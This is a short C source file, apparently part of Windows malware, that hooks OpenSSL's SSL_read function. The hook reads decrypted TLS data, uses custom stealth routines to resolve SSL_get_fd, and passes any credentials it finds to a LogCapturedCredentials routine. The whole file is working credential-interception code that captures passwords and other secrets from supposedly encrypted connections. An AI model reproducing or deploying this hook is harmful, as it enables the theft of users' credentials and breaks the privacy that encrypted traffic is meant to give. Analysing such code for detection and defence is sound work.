#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <openssl\ssl.h>
#include "misc.h"
#include "ntdll.h"

#include "engine.h"
#include "recv.h"
#include "ssl_read.h"

int CDECL NewSSL_read(SSL *ssl,void *buf,int num)
{
	int r,s=0;
	SSL_GET_FD pSSL_get_fd=(SSL_GET_FD)engine_NtGetProcAddress(engine_NtGetModuleHandleA("SSLEAY32"),"SSL_get_fd");
	
	r=OldSSL_read(ssl,buf,num);
	if (r>0)
	{
		if (pSSL_get_fd) 
			s=pSSL_get_fd(ssl);
		if (GetCredentials(buf,num)) 
			LogCapturedCredentials(buf,num,"<<:",s);
	}  

	return r;
}
